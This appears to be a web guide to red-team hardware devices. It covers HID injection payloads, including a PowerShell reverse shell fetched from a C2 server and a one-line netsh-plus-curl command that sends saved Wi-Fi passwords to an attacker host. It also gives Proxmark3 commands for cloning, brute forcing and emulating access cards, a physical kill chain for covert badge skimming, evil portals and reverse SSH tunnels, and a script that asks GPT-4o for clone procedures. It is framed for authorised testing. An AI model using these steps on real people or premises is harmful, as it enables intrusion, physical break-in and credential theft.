Hardware Hacking Device Ecosystem

Hardware hacking devices are purpose-built tools that give penetration testers physical-layer attack capabilities that software alone cannot provide. They interact directly with hardware interfaces -- USB HID emulation, sub-GHz radio, NFC/RFID, IR, Wi-Fi, Ethernet -- performing attacks that bypass network-layer security controls entirely. A red team kit equipped with these devices can compromise an organisation through physical access, rogue wireless infrastructure, credential harvesting, and lateral movement before a single network packet is logged by a SIEM.

These devices are used in authorised physical penetration tests, red team engagements, hardware security research, and security awareness demonstrations. They are not toys -- every device in this guide can cause significant security impact in the wrong hands. Always obtain written authorisation before deploying any of these tools in an operational environment.

[ ! ]

Authorised Engagements Only. Deploying HID injection, rogue Wi-Fi, or RFID cloning devices against targets without explicit written authorisation violates the Computer Misuse Act, CFAA, and equivalent global laws. Use only in isolated lab environments, your own equipment, or targets with documented written scope and authorisation.

Windows Reverse Shell Injection
DuckyScript · PowerShell
Opens Run dialog silently, launches a hidden PowerShell session, downloads and executes a staged reverse shell from a C2 server. Completes in under 3 seconds on an unlocked workstation. The entire payload never touches disk -- all execution happens in memory via PowerShell IEX. For the O.MG Cable version, the same payload is injected wirelessly through the web interface from an operator in a car park or adjacent room.

Wi-Fi Password Exfiltration
Windows netsh · HTTP POST
Exports all saved Windows Wi-Fi profiles (including passwords in plaintext) using the built-in netsh wlan export profile key=clear command, then immediately uploads the resulting XML files to an attacker-controlled server using curl (available by default on Windows 10+). The entire operation takes 4-6 seconds and requires no elevated privileges -- all Wi-Fi passwords are readable by any local user.
netsh wlan export profile key=clear → curl -F "f=@*.xml" http://attacker/upload

macOS Persistence via LaunchAgent
macOS · ~/Library/LaunchAgents
Opens Terminal via Spotlight, writes a LaunchAgent plist to the user's Library folder, and loads it with launchctl. The LaunchAgent establishes a reverse bash shell on every system boot without requiring root privileges. Since LaunchAgents run as the current user, they survive standard security tool detection that focuses on system-level persistence mechanisms and do not require password prompts.
Spotlight → Terminal → write ~/Library/LaunchAgents/com.upd.plist → launchctl load

LF HID Prox -- Read, Clone, Brute Force
125 kHz · Corporate Access Control
HID Prox is the most common corporate building access control card format. The Proxmark3 reads any HID Prox card in range: lf hid read captures the facility code and card number. lf hid clone -r [ID] writes the data to a T5577 blank card in under 5 seconds. The brute force module (lf hid brute) sequentially tries card numbers within a facility code -- useful when you have identified the facility code but cannot capture a specific card. Long-range LF antennas extend read range to 20-30cm for covert capture in lifts and lobbies.
lf hid read → capture ID → lf hid clone -r ID → T5577 blank card → door opens
⚡
MIFARE Classic autopwn -- Full Card Compromise
CRYPTO1 · darkside · hardnested
MIFARE Classic uses the proprietary CRYPTO1 cipher which has been fully cryptanalysed. The Proxmark3 hf mf autopwn command runs a cascade of attacks: darkside attack (recovers one key without any known keys), nested attack (recovers remaining keys using one known key), and hardnested attack (works even when the reader uses random UIDs). The result is a complete dump of all 16 sectors and all 32 sector keys in under 30 seconds. The dump is then written to a new MIFARE Classic blank card for a perfect clone.
hf mf autopwn → all keys recovered → hf-mf-UID-dump.bin → hf mf restore → clone complete
💻
Card Emulation -- No Physical Clone Needed
Standalone Mode · Battery Powered
The Proxmark3 RDV4 can emulate any card stored in its internal memory without writing to a physical blank card. hf mf eload loads a card dump to the Proxmark3 RAM, then hf mf sim presents the Proxmark3 itself to any MIFARE Classic reader. The built-in battery and Bluetooth add-on enable standalone wireless operation -- the operator accesses the Proxmark3 from a phone while tapping it to readers, making the attack entirely wireless and hands-free after initial setup.
hf mf eload -f dump.bin → hf mf sim → tap PM3 to reader → access granted (no card needed)

Red Team Hardware Engagement Workflows

Professional hardware red team operations chain multiple devices in coordinated attack sequences -- each device filling a specific role in the kill chain. The most impactful engagement patterns combine reconnaissance (Flipper Zero, wireless adapter), initial access (Proxmark3 card clone, BadUSB), persistence (LAN Turtle, O.MG Cable), and exfiltration (Bash Bunny, Pineapple MITM). The devices below are not independent tools -- they are components in an integrated physical penetration testing system.

Physical Pentest Kill Chain
01
RECONNAISSANCE
Passive RF environment survey from car park or street: identify Sub-GHz transmitters (parking barriers, gate fobs), scan NFC readers on doors to identify card type (Flipper Zero NFC reader detect), capture employee Wi-Fi probe requests from the Pineapple (passive mode), and photograph all visible physical access control hardware to identify manufacturer and card standard.
🔴 Devices: Flipper Zero • Wi-Fi Pineapple (passive) • Wireless Adapter
02
RFID CARD CAPTURE
Position a Proxmark3 RDV4 with long-range LF antenna in a briefcase or laptop bag near a target employee (lift, reception, coffee queue). The antenna captures HID Prox or MIFARE card data at 15-30cm range without any visible indicator to the target. The entire read takes 0.5 seconds. Return to the vehicle, clone the card to a T5577 blank, and present the cloned card to door readers for entry. MIFARE cards require a second pass near the reader (using the Proxmark3 in emulation mode if cloning fails).
🔴 Device: Proxmark3 RDV4 + Long-Range Antenna + T5577 blank cards
03
INITIAL FOOTHOLD -- HID INJECTION
Inside the facility, locate an unattended workstation (conference room, hot-desk, printer station). Insert a USB Rubber Ducky or plug in an O.MG Cable in place of the existing charging cable. The Ducky injects a payload in under 3 seconds -- establishing a reverse shell, dropping a persistence mechanism, or exfiltrating credentials. The O.MG Cable continues to provide wireless payload delivery after you leave the area, allowing injection from the car park hours later.
🔴 Devices: USB Rubber Ducky • O.MG Cable • Flipper Zero BadUSB
04
PERSISTENT NETWORK ACCESS
Plug a LAN Turtle into an available Ethernet port -- conference room tables, behind printers, in server rooms, or in IT closets. The LAN Turtle establishes an outbound AutoSSH reverse tunnel to an attacker-controlled VPS. Once active, the operator has persistent SSH access to the internal network from anywhere in the world, routed through the VPS, bypassing all perimeter controls. The LAN Turtle will maintain this tunnel indefinitely unless physically removed -- typical deployments persist for weeks in assessments.
🔴 Device: LAN Turtle • VPS running SSH server
05
WIRELESS CREDENTIAL HARVEST
Deploy the Wi-Fi Pineapple in a concealed location (under a conference table, in a planted backpack) powered by a USB-C powerbank. Enable PineAP KARMA mode and an Evil Portal cloning the organisation's VPN or Office 365 login page. Employee laptops and phones probing for remembered networks auto-associate. Credentials entered in the Evil Portal are captured in real time. Simultaneously run Responder on the Pineapple to capture NTLM hashes from Windows clients. The Bash Bunny on any accessed workstation runs Responder via USB Ethernet for a second credential capture vector.
🔴 Devices: Wi-Fi Pineapple • Bash Bunny • Wireless Adapter

#!/usr/bin/env python3 # Parse Proxmark3 autopwn output and generate RFID recon intelligence report # Usage: python3 rfid_ai.py pm3_output.txt import openai, sys, re def parse_pm3_output(filepath): with open(filepath) as f: raw = f.read() findings = { "card_type" : re.search(r"(MIFARE|HID|iCLASS|EM\d+|NTAG\d+)[^ ]*", raw), "uid" : re.search(r"UID\s*[:\|]\s*([0-9A-Fa-f\s]+)", raw), "keys_found" : len(re.findall(r"Key\s+(A|B)\s*[:\|]\s*[0-9A-Fa-f]+", raw)), "sectors" : len(re.findall(r"sector\s+\d+", raw, re.I)), "hid_fc" : re.search(r"Facility Code\s*[:\|]\s*(\d+)", raw), "hid_card" : re.search(r"Card Number\s*[:\|]\s*(\d+)", raw), "raw_snippet": raw[:3000] } return {k: (v.group(0) if hasattr(v,"group") else v) for k,v in findings.items()} def ai_rfid_report(findings): prompt = ( "You are a senior physical penetration tester analysing RFID card data from a Proxmark3. " "Based on the findings below, provide: " "1. CARD IDENTIFICATION -- type, security level, known vulnerabilities " "2. FACILITY CODE ANALYSIS -- if HID, what does the facility code tell us? " "3. ATTACK IMPACT -- what access was obtained or could be obtained? " "4. CLONE PROCEDURE -- exact Proxmark3 commands to clone this card type " "5. REMEDIATION -- specific recommendations for this card system " "Findings: " + str(findings) ) r = openai.OpenAI().chat.completions.create( model="gpt-4o", messages=[{"role":"user","content":prompt}] ) return r.choices[0].message.content filepath = sys.argv[1] if len(sys.argv) > 1 else "pm3_output.txt" findings = parse_pm3_output(filepath) print(f"[*] Card: {findings.get('card_type','Unknown')}") print(f"[*] Keys recovered: {findings.get('keys_found',0)}") print() print(ai_rfid_report(findings))
